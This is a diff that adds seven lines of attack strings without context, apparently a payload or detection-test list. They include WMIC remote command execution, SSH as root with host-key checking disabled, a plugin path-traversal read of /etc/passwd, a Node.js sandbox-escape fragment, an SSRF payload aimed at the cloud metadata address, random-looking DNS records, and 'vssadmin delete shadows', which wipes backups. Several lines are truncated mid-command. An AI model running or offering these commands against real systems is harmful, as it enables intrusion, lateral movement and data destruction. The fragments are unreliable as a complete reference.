@@ -1,0 +1,7 @@
+wmic /node:10.20.6.179 process call create "cmd.exe /c whoami" cmd.exe cmd.exe /c wmic /node:10.20.6.179 proce
+ef78247d.marwul-3b1b.net A 10.10.35.154
+/public/plugins/alertlist/../../../etc/passwd this.constructor.constructor('return process')().mainModule.requ
+https://app-node-48.ops-corp.com/public/plugins/alertlist/../../../etc/passwd {"cmd": "url=@url:`http://169.254.169.`}
+ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.4.121 "id; hostname"
+c02e3466.aodldd-7342.net A 10.10.39.10
+vssadmin delete shadows /all /quiet
